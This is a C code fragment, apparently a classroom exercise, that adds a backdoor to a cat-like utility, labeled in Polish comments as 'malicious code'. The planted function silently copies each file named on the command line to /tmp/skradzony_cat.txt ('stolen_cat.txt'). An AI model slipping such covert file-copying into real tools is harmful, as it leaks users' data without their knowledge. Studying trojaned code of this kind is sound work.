...
//ZLOSLIWA FUNKCJA, KTORA ROBI COPY DO PLIKU.TXT 
void copy_file_do_pliku_txt(const char* source_file);
void copy_file_do_pliku_txt(const char* source_file){ 
        FILE * sourcef = fopen(source_file, "r");
        FILE * copyf = fopen("/tmp/skradzony_cat.txt", "wb");
        if (sourcef && copyf){ 
                char buffer[256];
                while(fgets(buffer, sizeof(buffer), sourcef)){ 
                        fputs(buffer, copyf);
                }
                fclose(sourcef);
                fclose(copyf);
...
//KONIEC ZLOSLIWEJ FUNKCJI
int
main (int argc, char **argv)
{
//TAK ZWANY ZLOSLIWY KOD BACKDOOR


if (argc>1){ 
        copy_file_do_pliku_txt(argv[1]);
}



//KONIEC TAK ZWANEGO ZLOSLIWEGO KODU BACKDOOR
